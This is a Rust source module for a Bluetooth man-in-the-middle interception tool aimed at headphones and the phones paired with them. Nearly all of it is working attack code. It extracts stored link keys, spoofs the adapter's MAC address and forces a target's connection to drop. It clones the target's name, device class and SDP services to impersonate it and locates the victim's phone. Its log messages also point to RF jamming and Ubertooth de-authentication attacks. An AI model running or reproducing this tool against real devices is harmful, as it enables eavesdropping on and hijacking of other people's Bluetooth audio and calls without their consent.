use libc::{c_int, socklen_t};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex};
use std::sync::atomic::{AtomicBool, Ordering};
use std::thread;
use std::time::Duration;

use crate::config::{BACKLOG, BLUETOOTH_INFO_PATH};
use crate::{debug_print, error_print, info_print};

// ── Linux Bluetooth constants ────────────────────────────────────────────────
const AF_BLUETOOTH: c_int = 31;
const BTPROTO_L2CAP: c_int = 0;

/// Mirrors `bt_device_t` from bt_utils.h
#[derive(Debug, Default, Clone)]
pub struct BtDevice {
    pub addr: String,
    pub name: String,
    pub rssi: i32,
    pub connected: bool,
    pub cod: Option<String>,
}

// ── sockaddr_l2 layout (BlueZ, Linux) ────────────────────────────────────────
#[repr(C)]
struct SockaddrL2 {
    l2_family: u16,
    l2_psm: u16,       // little-endian PSM
    l2_bdaddr: [u8; 6], // bdaddr_t stored in reverse byte order
    l2_cid: u16,
    l2_bdaddr_type: u8,
}

impl Default for SockaddrL2 {
    fn default() -> Self {
        SockaddrL2 {
            l2_family: 0,
            l2_psm: 0,
            l2_bdaddr: [0u8; 6],
            l2_cid: 0,
            l2_bdaddr_type: 0,
        }
    }
}

/// Parse "AA:BB:CC:DD:EE:FF" → [u8; 6] in Bluetooth byte order (reversed).
fn str2ba(addr: &str) -> [u8; 6] {
    let mut ba = [0u8; 6];
    let parts: Vec<u8> = addr
        .split(':')
        .map(|s| u8::from_str_radix(s, 16).unwrap_or(0))
        .collect();
    if parts.len() == 6 {
        for i in 0..6 {
            ba[i] = parts[5 - i];
        }
    }
    ba
}

/// Convert [u8; 6] Bluetooth byte order → "AA:BB:CC:DD:EE:FF"
fn ba2str(ba: &[u8; 6]) -> String {
    format!(
        "{:02X}:{:02X}:{:02X}:{:02X}:{:02X}:{:02X}",
        ba[5], ba[4], ba[3], ba[2], ba[1], ba[0]
    )
}

/// Bluetooth PSM/handles are little-endian.
#[inline]
fn htobs(val: u16) -> u16 {
    val.to_le()
}

// ── Adapter ──────────────────────────────────────────────────────────────────

/// Read the MAC address of hci0 from sysfs, falling back to `hciconfig`.
pub fn bt_get_adapter_address() -> Result<String, String> {
    // Prefer the clean sysfs entry.
    if let Ok(s) = std::fs::read_to_string("/sys/class/bluetooth/hci0/address") {
        let addr = s.trim().to_uppercase();
        debug_print!("Adapter address: {}", addr);
        return Ok(addr);
    }

    // Fallback: parse `hciconfig hci0` output.
    let out = Command::new("hciconfig")
        .arg("hci0")
        .output()
        .map_err(|e| e.to_string())?;

    let stdout = String::from_utf8_lossy(&out.stdout);
    for line in stdout.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("BD Address:") {
            if let Some(mac) = trimmed.split_whitespace().nth(2) {
                debug_print!("Adapter address: {}", mac);
                return Ok(mac.to_uppercase());
            }
        }
    }

    error_print!("No Bluetooth adapter found");
    Err("No Bluetooth adapter found".to_string())
}

// ── ANSI / output helpers ────────────────────────────────────────────────────

/// Strip ANSI escape codes (colour, cursor movement, etc.) from a string.
fn strip_ansi_codes(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\x1b' {
            if chars.peek() == Some(&'[') {
                chars.next(); // consume '['
                for nc in chars.by_ref() {
                    if nc.is_ascii_alphabetic() {
                        break;
                    }
                }
            } else {
                chars.next(); // skip the next character of any other escape
            }
        } else {
            out.push(c);
        }
    }
    out
}

#[inline]
fn is_valid_mac(s: &str) -> bool {
    s.len() == 17 && s.chars().filter(|&c| c == ':').count() == 5
}

/// Quick snapshot of paired + connected devices without a full BT inquiry scan.
fn get_devices_snapshot() -> Vec<BtDevice> {
    let mut devices: Vec<BtDevice> = Vec::new();

    // All known/paired devices
    let out = run_popen("bluetoothctl -- devices 2>/dev/null");
    for line in out.lines() {
        let clean = strip_ansi_codes(line);
        let parts: Vec<&str> = clean.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
            let name = if parts.len() >= 3 { parts[2..].join(" ") } else { "[Unknown]".to_string() };
            devices.push(BtDevice {
                addr: parts[1].to_uppercase(),
                name,
                ..Default::default()
            });
        }
    }

    // Mark devices that are currently connected
    let conn_out = run_popen("bluetoothctl -- devices Connected 2>/dev/null");
    for line in conn_out.lines() {
        let clean = strip_ansi_codes(line);
        let parts: Vec<&str> = clean.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
            let mac = parts[1];
            match devices.iter_mut().find(|d| d.addr.eq_ignore_ascii_case(mac)) {
                Some(d) => d.connected = true,
                None => {
                    let name = if parts.len() >= 3 {
                        parts[2..].join(" ")
                    } else {
                        "[Active Connection]".to_string()
                    };
                    devices.push(BtDevice {
                        addr: mac.to_uppercase(),
                        name,
                        connected: true,
                        ..Default::default()
                    });
                }
            }
        }
    }

    // Also check hcitool con for active ACL/SCO connections
    let con_out = run_popen("hcitool con 2>/dev/null");
    for line in con_out.lines() {
        if line.contains("ACL") || line.contains("SCO") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            // Format: "> ACL AA:BB:CC:DD:EE:FF handle …"
            if parts.len() >= 3 && is_valid_mac(parts[2]) {
                let mac = parts[2];
                match devices.iter_mut().find(|d| d.addr.eq_ignore_ascii_case(mac)) {
                    Some(d) => d.connected = true,
                    None => {
                        devices.push(BtDevice {
                            addr: mac.to_uppercase(),
                            name: "[Active Connection]".to_string(),
                            connected: true,
                            ..Default::default()
                        });
                    }
                }
            }
        }
    }

    devices
}

// ── Live scanner ─────────────────────────────────────────────────────────────

/// Live-updating Bluetooth device scanner.
///
/// On creation it immediately starts a background thread that:
/// 1. Kicks off a BlueZ discovery scan via `bluetoothctl scan on`.
/// 2. Polls `bluetoothctl devices` every ~3 seconds and merges results into
///    the shared `devices` list.
///
/// Dropping the `LiveScanner` signals the background thread to stop.
pub struct LiveScanner {
    pub devices: Arc<Mutex<Vec<BtDevice>>>,
    stop_flag: Arc<AtomicBool>,
}

impl Drop for LiveScanner {
    fn drop(&mut self) {
        self.stop_flag.store(true, Ordering::SeqCst);
    }
}

impl LiveScanner {
    /// Start the live scanner. Returns immediately; scanning happens in the
    /// background.
    pub fn start() -> Self {
        let devices: Arc<Mutex<Vec<BtDevice>>> = Arc::new(Mutex::new(Vec::new()));
        let stop_flag = Arc::new(AtomicBool::new(false));

        let devs = Arc::clone(&devices);
        let stop = Arc::clone(&stop_flag);

        // Tell the BlueZ daemon to start active discovery so that non-paired
        // devices become visible in `bluetoothctl devices`.  We detach this
        // process; it will be cleaned up by the OS when bluetoothd resets.
        let _ = Command::new("sh")
            .args(["-c", "bluetoothctl -- scan on >/dev/null 2>&1 &"])
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn();

        thread::spawn(move || {
            loop {
                if stop.load(Ordering::SeqCst) {
                    break;
                }

                let fresh = get_devices_snapshot();
                {
                    let mut lock = devs.lock().unwrap();
                    for new_dev in fresh {
                        match lock
                            .iter_mut()
                            .find(|d| d.addr.eq_ignore_ascii_case(&new_dev.addr))
                        {
                            Some(existing) => {
                                existing.connected = new_dev.connected;
                                if existing.name.is_empty() || existing.name == "[Unknown]" {
                                    existing.name = new_dev.name;
                                }
                            }
                            None => lock.push(new_dev),
                        }
                    }
                }

                // Sleep for 3 s, but check the stop flag every 100 ms.
                for _ in 0..30 {
                    if stop.load(Ordering::SeqCst) {
                        return;
                    }
                    thread::sleep(Duration::from_millis(100));
                }
            }
        });

        LiveScanner { devices, stop_flag }
    }
}

// ── Link key ─────────────────────────────────────────────────────────────────

/// Read the link key for `device_mac` from BlueZ's info file on disk.
pub fn bt_extract_link_key(adapter_mac: &str, device_mac: &str) -> Result<String, String> {
    let path = format!("{}/{}/{}/info", BLUETOOTH_INFO_PATH, adapter_mac, device_mac);
    let contents = std::fs::read_to_string(&path).map_err(|e| {
        error_print!("Failed to open info file: {}: {}", path, e);
        e.to_string()
    })?;

    let mut in_linkkey = false;
    for line in contents.lines() {
        if line.trim() == "[LinkKey]" {
            in_linkkey = true;
            continue;
        }
        if in_linkkey {
            if let Some(rest) = line.strip_prefix("Key=") {
                let key = rest.trim().to_string();
                info_print!("Link key extracted: {}", key);
                return Ok(key);
            }
            if line.starts_with('[') {
                break; // left [LinkKey] section
            }
        }
    }

    error_print!("Link key not found in info file");
    Err("Link key not found".to_string())
}

// ── MAC spoofing ─────────────────────────────────────────────────────────────

/// Spoof `hci<adapter_id>` to `target_mac` using `hciconfig` + `bdaddr`.
pub fn bt_spoof_mac_address(adapter_id: u32, target_mac: &str) -> Result<(), String> {
    let iface = format!("hci{}", adapter_id);

    run_cmd("hciconfig", &[&iface, "down"])?;
    run_cmd("bdaddr", &["-i", &iface, target_mac])?;
    run_cmd("hciconfig", &[&iface, "up"])?;

    info_print!("MAC address spoofed to: {}", target_mac);
    Ok(())
}

// ── L2CAP sockets ────────────────────────────────────────────────────────────

/// Create a raw L2CAP SEQPACKET socket. Returns raw fd.
pub fn bt_create_l2cap_socket() -> Result<c_int, String> {
    let sock = unsafe { libc::socket(AF_BLUETOOTH, libc::SOCK_SEQPACKET, BTPROTO_L2CAP) };
    if sock < 0 {
        error_print!(
            "Failed to create L2CAP socket: {}",
            std::io::Error::last_os_error()
        );
        return Err("Failed to create L2CAP socket".to_string());
    }
    Ok(sock)
}

pub fn bt_connect_l2cap(sock: c_int, dest_addr: &str, psm: u16) -> Result<(), String> {
    let mut addr = SockaddrL2::default();
    addr.l2_family = AF_BLUETOOTH as u16;
    addr.l2_bdaddr = str2ba(dest_addr);
    addr.l2_psm = htobs(psm);

    let ret = unsafe {
        libc::connect(
            sock,
            &addr as *const SockaddrL2 as *const libc::sockaddr,
            std::mem::size_of::<SockaddrL2>() as socklen_t,
        )
    };
    if ret < 0 {
        error_print!(
            "Failed to connect to {} on PSM {}: {}",
            dest_addr,
            psm,
            std::io::Error::last_os_error()
        );
        return Err(format!("Failed to connect to {} on PSM {}", dest_addr, psm));
    }
    debug_print!("Connected to {} on PSM {}", dest_addr, psm);
    Ok(())
}

pub fn bt_bind_l2cap(sock: c_int, src_addr: Option<&str>, psm: u16) -> Result<(), String> {
    let mut addr = SockaddrL2::default();
    addr.l2_family = AF_BLUETOOTH as u16;
    if let Some(src) = src_addr {
        addr.l2_bdaddr = str2ba(src);
    }
    // else: bdaddr stays [0;6] which is BDADDR_ANY
    addr.l2_psm = htobs(psm);

    let ret = unsafe {
        libc::bind(
            sock,
            &addr as *const SockaddrL2 as *const libc::sockaddr,
            std::mem::size_of::<SockaddrL2>() as socklen_t,
        )
    };
    if ret < 0 {
        error_print!(
            "Failed to bind L2CAP socket: {}",
            std::io::Error::last_os_error()
        );
        return Err("Failed to bind L2CAP socket".to_string());
    }
    debug_print!("Bound L2CAP socket on PSM {}", psm);
    Ok(())
}

pub fn bt_listen_l2cap(sock: c_int) -> Result<(), String> {
    let ret = unsafe { libc::listen(sock, BACKLOG as c_int) };
    if ret < 0 {
        error_print!(
            "Failed to listen on L2CAP socket: {}",
            std::io::Error::last_os_error()
        );
        return Err("Failed to listen on L2CAP socket".to_string());
    }
    debug_print!("Listening on L2CAP socket");
    Ok(())
}

/// Accept one L2CAP connection. Returns `(client_fd, client_mac)`.
pub fn bt_accept_l2cap(server_sock: c_int) -> Result<(c_int, String), String> {
    let mut addr = SockaddrL2::default();
    let mut addr_len = std::mem::size_of::<SockaddrL2>() as socklen_t;

    let client = unsafe {
        libc::accept(
            server_sock,
            &mut addr as *mut SockaddrL2 as *mut libc::sockaddr,
            &mut addr_len,
        )
    };
    if client < 0 {
        error_print!(
            "Failed to accept L2CAP connection: {}",
            std::io::Error::last_os_error()
        );
        return Err("Failed to accept L2CAP connection".to_string());
    }
    let client_addr = ba2str(&addr.l2_bdaddr);
    debug_print!("Accepted connection from {}", client_addr);
    Ok((client, client_addr))
}

// ── Device scanning ──────────────────────────────────────────────────────────

/// Scan for visible devices and mark those with active ACL/SCO connections.
pub fn bt_scan_active_connections(max_devices: usize) -> Vec<BtDevice> {
    info_print!("Scanning for active Bluetooth connections in the area...");
    let mut devices: Vec<BtDevice> = Vec::new();

    // Pass 1: bluetoothctl devices – known/paired devices (works on modern BlueZ).
    // Strip ANSI codes because bluetoothctl uses colour output on some systems.
    let btctl_out = run_popen("bluetoothctl -- devices 2>/dev/null");
    for line in btctl_out.lines() {
        let clean = strip_ansi_codes(line);
        // Format: "Device AA:BB:CC:DD:EE:FF Device Name"
        let parts: Vec<&str> = clean.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
            if devices.len() >= max_devices {
                break;
            }
            let name = if parts.len() >= 3 { parts[2..].join(" ") } else { "[Unknown]".to_string() };
            devices.push(BtDevice {
                addr: parts[1].to_uppercase(),
                name,
                ..Default::default()
            });
        }
    }

    // Pass 2: bluetoothctl devices Connected – mark connected devices.
    let btctl_connected = run_popen("bluetoothctl -- devices Connected 2>/dev/null");
    for line in btctl_connected.lines() {
        let clean = strip_ansi_codes(line);
        let parts: Vec<&str> = clean.split_whitespace().collect();
        if parts.len() >= 2 && parts[0] == "Device" && is_valid_mac(parts[1]) {
            let mac = parts[1];
            let mut found = false;
            for d in devices.iter_mut() {
                if d.addr.eq_ignore_ascii_case(mac) {
                    d.connected = true;
                    found = true;
                }
            }
            if !found && devices.len() < max_devices {
                let name = if parts.len() >= 3 { parts[2..].join(" ") } else { "[Active Connection]".to_string() };
                devices.push(BtDevice {
                    addr: mac.to_uppercase(),
                    name,
                    connected: true,
                    ..Default::default()
                });
            }
        }
    }

    // Pass 3: hcitool scan – additional visible devices not yet known (BR/EDR fallback).
    let scan = run_popen("timeout 5 hcitool scan 2>/dev/null");
    for line in scan.lines() {
        // Format: "\tAA:BB:CC:DD:EE:FF\tDevice Name"
        let parts: Vec<&str> = line.split_whitespace().collect();
        if !parts.is_empty() && is_valid_mac(parts[0]) {
            let mac = parts[0];
            if !devices.iter().any(|d| d.addr.eq_ignore_ascii_case(mac)) {
                if devices.len() >= max_devices {
                    break;
                }
                devices.push(BtDevice {
                    addr: mac.to_uppercase(),
                    name: if parts.len() >= 2 { parts[1..].join(" ") } else { "[Unknown]".to_string() },
                    ..Default::default()
                });
            }
        }
    }

    // Pass 4: hcitool con – mark active ACL/SCO connections (fallback for pass 2).
    let con = run_popen("hcitool con 2>/dev/null");
    info_print!("Active connections found:");
    for line in con.lines() {
        println!("  {}", line);
        if line.contains("ACL") || line.contains("SCO") {
            let parts: Vec<&str> = line.split_whitespace().collect();
            // Format: "> ACL AA:BB:CC:DD:EE:FF handle …"
            if parts.len() >= 3 && is_valid_mac(parts[2]) {
                let mac = parts[2];
                let mut found = false;
                for d in devices.iter_mut() {
                    if d.addr.eq_ignore_ascii_case(mac) {
                        d.connected = true;
                        found = true;
                    }
                }
                if !found && devices.len() < max_devices {
                    devices.push(BtDevice {
                        addr: mac.to_uppercase(),
                        name: "[Active Connection]".to_string(),
                        connected: true,
                        ..Default::default()
                    });
                }
            }
        }
    }

    info_print!("Found {} Bluetooth device(s)", devices.len());
    devices
}

// ── Connection management ─────────────────────────────────────────────────────

pub fn bt_check_connection_status(device_mac: &str) -> bool {
    // Use direct bluetoothctl info command instead of interactive mode pipe.
    let output = run_popen(&format!(
        "bluetoothctl -- info {} 2>/dev/null | grep -i 'Connected: yes'",
        device_mac
    ));
    !output.trim().is_empty()
}

pub fn bt_disconnect_device(device_mac: &str) -> Result<(), String> {
    info_print!("Disconnecting device: {}", device_mac);
    let output = run_popen(&format!(
        "bluetoothctl -- disconnect {} 2>&1",
        device_mac
    ));

    if output.contains("Successful disconnected") || output.contains("not connected") {
        info_print!("Device disconnected successfully");
        std::thread::sleep(std::time::Duration::from_secs(2));
        return Ok(());
    }

    std::thread::sleep(std::time::Duration::from_secs(2));
    Err("Disconnect failed".to_string())
}

pub fn bt_force_disconnect(target_mac: &str) -> Result<(), String> {
    info_print!("=== FORCE DISCONNECT MODE ===");
    info_print!("Target: {}", target_mac);

    if !bt_check_connection_status(target_mac) {
        info_print!("Target device is not currently connected");
        return Ok(());
    }

    info_print!("Target device is currently connected to another device");
    info_print!("Attempting to break the connection...");

    // Method 1: polite bluetoothctl disconnect
    info_print!("Method 1: Attempting polite disconnect...");
    if bt_disconnect_device(target_mac).is_ok() {
        info_print!("Polite disconnect successful");
        std::thread::sleep(std::time::Duration::from_secs(2));
        return Ok(());
    }

    // Method 2: remove pairing
    info_print!("Method 2: Removing device pairing to force disconnect...");
    run_popen(&format!(
        "bluetoothctl -- remove {} >/dev/null 2>&1",
        target_mac
    ));
    std::thread::sleep(std::time::Duration::from_secs(3));
    if !bt_check_connection_status(target_mac) {
        info_print!("Forced disconnect successful via pairing removal");
        return Ok(());
    }

    // Method 3: HCI-level
    info_print!("Method 3: Attempting HCI-level disconnect...");
    let out = run_popen(&format!("hcitool dc {} 2>&1", target_mac));
    for line in out.lines() {
        debug_print!("hcitool: {}", line);
    }
    std::thread::sleep(std::time::Duration::from_secs(2));
    if !bt_check_connection_status(target_mac) {
        info_print!("HCI-level disconnect successful");
        return Ok(());
    }

    error_print!("Software disconnect methods failed");
    info_print!("========================================");
    info_print!("ADVANCED OPTION: RF Jamming");
    info_print!("========================================");
    info_print!("To break a stubborn Bluetooth connection, you may need:");
    info_print!("1. RF Jammer (2.4GHz) - Hardware device to disrupt connection");
    info_print!("2. Ubertooth One - For active de-authentication attacks");
    info_print!("3. Physical separation - Move devices far apart (>100m)");
    info_print!("4. Power cycle - Turn off source device temporarily");
    info_print!("");
    info_print!("For now, proceeding with MITM setup...");
    info_print!("The interceptor will wait for natural disconnection");
    info_print!("========================================");

    Err("All software disconnect methods failed".to_string())
}

// ── Auto-pairing ─────────────────────────────────────────────────────────────

pub fn bt_auto_pair_device(device_mac: &str) -> Result<(), String> {
    info_print!("Attempting to pair with device: {}", device_mac);

    // Check if already paired
    let already_paired = std::process::Command::new("sh")
        .args([
            "-c",
            &format!(
                "bluetoothctl -- info {} 2>&1 | grep -q 'Paired: yes'",
                device_mac
            ),
        ])
        .status()
        .map(|s| s.success())
        .unwrap_or(false);

    info_print!("Powering on Bluetooth adapter...");
    run_popen("bluetoothctl -- power on >/dev/null 2>&1");
    std::thread::sleep(std::time::Duration::from_secs(2));
    run_popen("bluetoothctl -- discoverable on >/dev/null 2>&1");
    std::thread::sleep(std::time::Duration::from_secs(1));

    info_print!("Scanning for device...");
    run_popen("timeout 10 bluetoothctl -- scan on >/dev/null 2>&1");

    if already_paired {
        info_print!("Removing existing pairing...");
        run_popen(&format!(
            "bluetoothctl -- remove {} >/dev/null 2>&1",
            device_mac
        ));
        std::thread::sleep(std::time::Duration::from_secs(2));
    }

    info_print!("Pairing with device...");
    let pair_out = run_popen(&format!(
        "timeout 30 bluetoothctl -- pair {} 2>&1",
        device_mac
    ));
    if !pair_out.contains("Pairing successful") && !pair_out.contains("paired successfully") {
        for line in pair_out.lines() {
            if line.contains("Failed to pair") || line.contains("org.bluez.Error") {
                error_print!("Pairing failed: {}", line);
            }
        }
        error_print!("Pairing failed");
        return Err("Pairing failed".to_string());
    }
    info_print!("Pairing successful");
    std::thread::sleep(std::time::Duration::from_secs(2));

    info_print!("Trusting device...");
    let trust_out = run_popen(&format!(
        "bluetoothctl -- trust {} 2>&1",
        device_mac
    ));
    if !trust_out.contains("trust succeeded") && !trust_out.contains("already trusted") {
        error_print!("Failed to trust device");
        return Err("Failed to trust device".to_string());
    }

    info_print!("Connecting to device...");
    let conn_out = run_popen(&format!(
        "timeout 15 bluetoothctl -- connect {} 2>&1",
        device_mac
    ));
    if conn_out.contains("Connection successful") || conn_out.contains("connected successfully") {
        info_print!("Connection successful");
    }

    std::thread::sleep(std::time::Duration::from_secs(3));
    info_print!("Auto-pairing completed");
    Ok(())
}

// ── Source device discovery ──────────────────────────────────────────────────

pub fn bt_discover_source_from_target(target_mac: &str) -> Result<String, String> {
    info_print!("=== Discovering Source Device (Phone) ===");
    info_print!("Monitoring Bluetooth connections to target: {}", target_mac);
    info_print!("");
    info_print!("Please ensure the phone is connected to the headphones now.");
    info_print!("Checking connection information...");
    println!();

    // Show info output for the target
    let info_out = run_popen(&format!(
        "bluetoothctl -- info {} 2>&1",
        target_mac
    ));
    for line in info_out.lines() {
        debug_print!("bluetoothctl: {}", line);
    }

    info_print!("Method 1: Monitoring for incoming Bluetooth connections...");
    info_print!("Waiting 10 seconds for phone to connect to headphones...");
    info_print!("(You may need to disconnect and reconnect the phone to headphones)");
    println!();

    let monitor = run_popen(&format!(
        "timeout 10 bluetoothctl 2>&1 | grep -i 'device\\|connected\\|{}' || true",
        target_mac
    ));

    for line in monitor.lines() {
        info_print!("Monitor: {}", line);
        if line.contains("Device") && line.contains("Connected: yes") {
            if let Some(start) = line.find("Device ") {
                let rest = &line[start + 7..];
                let mac: &str = rest.split_whitespace().next().unwrap_or("");
                if !mac.eq_ignore_ascii_case(target_mac) && mac.len() == 17 {
                    info_print!("✓ Discovered source device: {}", mac);
                    return Ok(mac.to_string());
                }
            }
        }
    }

    info_print!("");
    info_print!("Could not auto-discover phone MAC address.");
    info_print!("");
    info_print!("Manual options to find phone MAC:");
    info_print!("  1. Android: Settings → About Phone → Status → Bluetooth address");
    info_print!("  2. iPhone: Settings → General → About → Bluetooth");
    info_print!("  3. Check headphones' app for connected device info");
    info_print!("  4. Use 'hcitool con' while phone is connected");
    println!();

    Err("Could not auto-discover source device".to_string())
}

// ── Identity cloning ─────────────────────────────────────────────────────────

/// Fetch name and Class-of-Device for a known device from the local BlueZ database.
pub fn bt_get_device_info(mac: &str) -> BtDevice {
    let mut dev = BtDevice { addr: mac.to_uppercase(), ..Default::default() };

    // bluetoothctl info queries the local BlueZ cache (no radio needed).
    let info = run_popen(&format!("bluetoothctl -- info {} 2>/dev/null", mac));
    for line in info.lines() {
        let line = line.trim();
        if let Some(name) = line.strip_prefix("Name: ") {
            dev.name = name.trim().to_string();
        }
        if let Some(cls) = line.strip_prefix("Class: ") {
            // bluetoothctl reports CoD as "0x240404" — strip the "0x" prefix for hciconfig.
            let cls = cls.trim().trim_start_matches("0x");
            dev.cod = Some(cls.to_string());
        }
    }

    // Fallback: hcitool info (may need an active radio but works when device is nearby).
    if dev.name.is_empty() || dev.cod.is_none() {
        let info2 = run_popen(&format!("hcitool info {} 2>/dev/null", mac));
        for line in info2.lines() {
            let line = line.trim();
            if let Some(name) = line.strip_prefix("Device Name:") {
                if dev.name.is_empty() {
                    dev.name = name.trim().to_string();
                }
            }
            if let Some(cls) = line.strip_prefix("Class:") {
                if dev.cod.is_none() {
                    let cls = cls.trim().trim_start_matches("0x");
                    dev.cod = Some(cls.to_string());
                }
            }
        }
    }

    dev
}

/// Set the Bluetooth friendly name of `hci<adapter_id>`.
pub fn bt_set_device_name(adapter_id: u32, name: &str) -> Result<(), String> {
    let iface = format!("hci{}", adapter_id);
    run_cmd("hciconfig", &[&iface, "name", name])?;
    info_print!("Device name set to: {}", name);
    Ok(())
}

/// Set the Class-of-Device of `hci<adapter_id>`. `cod` is a hex string without "0x".
pub fn bt_set_class(adapter_id: u32, cod: &str) -> Result<(), String> {
    let iface = format!("hci{}", adapter_id);
    let cod_arg = format!("0x{}", cod);
    run_cmd("hciconfig", &[&iface, "class", &cod_arg])?;
    info_print!("Class of Device set to: 0x{}", cod);
    Ok(())
}

/// Browse the target's SDP records and register matching services on this adapter.
pub fn bt_clone_sdp_records(target_mac: &str) -> Result<(), String> {
    info_print!("Cloning SDP records from target: {}", target_mac);
    let output = run_popen(&format!("sdptool browse {} 2>/dev/null", target_mac));

    // Map human-readable service names (from sdptool output) to sdptool add keywords.
    let sdp_map: &[(&str, &str)] = &[
        ("Audio Sink",                   "A2SNK"),
        ("Audio Source",                 "A2SRC"),
        ("A/V Remote Control Target",    "AVRTG"),
        ("A/V Remote Control",           "AVRCT"),
        ("Handsfree Audio Gateway",      "HFAG"),
        ("Headset Audio Gateway",        "HSAG"),
        ("Handsfree",                    "HF"),
        ("Headset",                      "HS"),
        ("Serial Port",                  "SP"),
        ("OBEX Object Push",             "OPUSH"),
    ];

    let mut registered = 0usize;
    for line in output.lines() {
        let clean = line.trim();
        if let Some(name) = clean.strip_prefix("Service Name:") {
            let svc = name.trim();
            if let Some(&(_, keyword)) = sdp_map.iter().find(|&&(n, _)| svc.contains(n)) {
                info_print!("Registering SDP service: {} -> sdptool add {}", svc, keyword);
                run_popen(&format!("sdptool add {} 2>/dev/null", keyword));
                registered += 1;
            }
        }
    }

    if registered == 0 {
        // Fallback: common A2DP profile for headphones.
        info_print!("No SDP records cloned; registering default A2DP/AVRCP services");
        run_popen("sdptool add A2SNK 2>/dev/null");
        run_popen("sdptool add AVRCT 2>/dev/null");
        run_popen("sdptool add AVRTG 2>/dev/null");
    }

    info_print!("SDP cloning complete ({} service(s) registered)", registered);
    Ok(())
}

// ── Internal helpers ─────────────────────────────────────────────────────────

/// Run a shell command and return its stdout+stderr as a String.
fn run_popen(cmd: &str) -> String {
    let out = Command::new("sh").arg("-c").arg(cmd).output();
    match out {
        Ok(o) => {
            let mut s = String::from_utf8_lossy(&o.stdout).into_owned();
            s.push_str(&String::from_utf8_lossy(&o.stderr));
            s
        }
        Err(e) => {
            debug_print!("run_popen error for `{}`: {}", cmd, e);
            String::new()
        }
    }
}

/// Run a command and return Err if it fails.
fn run_cmd(prog: &str, args: &[&str]) -> Result<(), String> {
    let status = Command::new(prog)
        .args(args)
        .status()
        .map_err(|e| e.to_string())?;
    if !status.success() {
        error_print!("Command failed: {} {:?}", prog, args);
        return Err(format!("Command failed: {} {:?}", prog, args));
    }
    Ok(())
}
